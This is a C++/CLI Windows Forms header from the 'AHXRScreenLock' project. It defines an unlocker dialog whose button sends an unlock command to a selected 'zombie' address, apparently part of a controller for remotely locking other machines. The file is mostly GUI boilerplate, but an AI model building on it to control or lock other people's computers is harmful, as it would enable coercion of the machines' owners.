/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#pragma once

#include "on_command.h"

namespace AHXRListener {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Summary for frmCommand
	/// </summary>
	public ref class frmCommand : public System::Windows::Forms::Form
	{
	public:
		frmCommand(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~frmCommand()
		{
			if (components)
			{
				delete components;
			}
		}

	protected:


	private: System::Windows::Forms::Button^  btnUnlock;
	private: System::Windows::Forms::Button^  btnCancel;


	private:
		/// <summary>
		/// Required designer variable.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			this->btnUnlock = (gcnew System::Windows::Forms::Button());
			this->btnCancel = (gcnew System::Windows::Forms::Button());
			this->SuspendLayout();
			// 
			// btnUnlock
			// 
			this->btnUnlock->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9.75F));
			this->btnUnlock->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnUnlock->Location = System::Drawing::Point(12, 12);
			this->btnUnlock->Name = L"btnUnlock";
			this->btnUnlock->Size = System::Drawing::Size(128, 49);
			this->btnUnlock->TabIndex = 8;
			this->btnUnlock->Text = L"Unlock";
			this->btnUnlock->UseVisualStyleBackColor = true;
			this->btnUnlock->Click += gcnew System::EventHandler(this, &frmCommand::btnUnlock_Click);
			// 
			// btnCancel
			// 
			this->btnCancel->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9.75F));
			this->btnCancel->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnCancel->Location = System::Drawing::Point(166, 12);
			this->btnCancel->Name = L"btnCancel";
			this->btnCancel->Size = System::Drawing::Size(128, 49);
			this->btnCancel->TabIndex = 9;
			this->btnCancel->Text = L"Cancel";
			this->btnCancel->UseVisualStyleBackColor = true;
			this->btnCancel->Click += gcnew System::EventHandler(this, &frmCommand::btnCancel_Click);
			// 
			// frmCommand
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(35)), static_cast<System::Int32>(static_cast<System::Byte>(35)),
				static_cast<System::Int32>(static_cast<System::Byte>(35)));
			this->ClientSize = System::Drawing::Size(306, 74);
			this->Controls->Add(this->btnCancel);
			this->Controls->Add(this->btnUnlock);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::FixedDialog;
			this->MaximizeBox = false;
			this->MaximumSize = System::Drawing::Size(312, 100);
			this->MinimizeBox = false;
			this->MinimumSize = System::Drawing::Size(312, 100);
			this->Name = L"frmCommand";
			this->ShowIcon = false;
			this->Text = L"AHXRScreenLock - Listener - Unlocker";
			this->FormClosing += gcnew System::Windows::Forms::FormClosingEventHandler(this, &frmCommand::frmCommand_FormClosing);
			this->ResumeLayout(false);

		}
#pragma endregion
	private: System::Void btnUnlock_Click(System::Object^  sender, System::EventArgs^  e) {
		void ( * callback )(char *);
		callback = &onClientSendCommand;

		std::string s_command(convertCommand(UNLOCK_COMMAND));
		s_command += getZombieAddress(getZombieIDFromIDX(i_selected_idx));
		callback((char*)s_command.c_str());
		closeCommandGUI(this);
	}
	private: System::Void btnCancel_Click(System::Object^  sender, System::EventArgs^  e) {
		closeCommandGUI(this);
	}
	private: System::Void frmCommand_FormClosing(System::Object^  sender, System::Windows::Forms::FormClosingEventArgs^  e) {
		b_unlock_dialog = false;
	}
	};
}
